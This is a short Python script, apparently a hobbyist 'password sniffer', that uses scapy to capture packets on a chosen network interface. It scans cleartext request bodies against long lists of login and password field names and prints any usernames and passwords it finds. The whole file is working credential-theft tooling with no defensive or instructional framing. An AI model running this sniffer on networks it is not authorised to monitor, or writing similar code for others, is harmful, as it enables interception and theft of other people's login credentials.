from scapy.all import *
from urllib import parse
import re
from scapy.layers.inet import IP
from termcolor import colored

def processed_packets(packet):
    if packet.haslayer(TCP) and packet.haslayer(Raw) and packet.haslayer(IP):
        body = bytes(packet[TCP].payload)
        body_str = "".join(map(chr, bytes(body)))
        username_password = get_creds(body_str)
        if username_password != None:
            print(body_str)
            print(parse.unquote(username_password[0]))
            print(parse.unquote(username_password[1]))
        else:
            pass

def get_creds(body):
    user = None
    password = None
    userfields = ['log', 'login', 'wpname', 'ahd_username', 'unickname', 'nickname', 'user', 'user_name',
                  'alias', 'pseudo', 'email', 'username', '_username', 'userid', 'form_loginname', 'loginname',
                  'login_id', 'loginid', 'session_key', 'sessionkey', 'pop_login', 'uid', 'id', 'user_id', 'screename',
                  'uname', 'ulogin', 'acctname', 'account', 'member', 'mailaddress', 'membername', 'login_username',
                  'login_email', 'loginusername', 'loginemail', 'uin', 'sign-in', 'usuario']
    passfields = ['ahd_password', 'pass', 'password', '_password', 'passwd', 'session_password', 'sessionpassword',
                  'login_password', 'loginpassword', 'form_pw', 'pw', 'userpassword', 'pwd', 'upassword',
                  'login_password'
                  'passwort', 'passwrd', 'wppassword', 'upasswd', 'senha']
    for login in userfields:
        login_regex = re.search('(%s=[^&]+)' % login, body, re.IGNORECASE)
        if login_regex:
            user = login_regex.group()
    for passfield in passfields:
        password_regex = re.search('(%s=[^&]+)' % passfield, body, re.IGNORECASE)
        if password_regex:
            password = password_regex.group()
    
    if user and password:
        return(user, password)

interface = input(colored('[+]Enter Network Interface: ', 'green', attrs=['bold']))
try:
    sniff(iface=interface, prn=processed_packets, store=0)
except KeyboardInterrupt:
    print(colored('[-] Quiting Password Sniffer [-]', 'red', attrs=['bold']))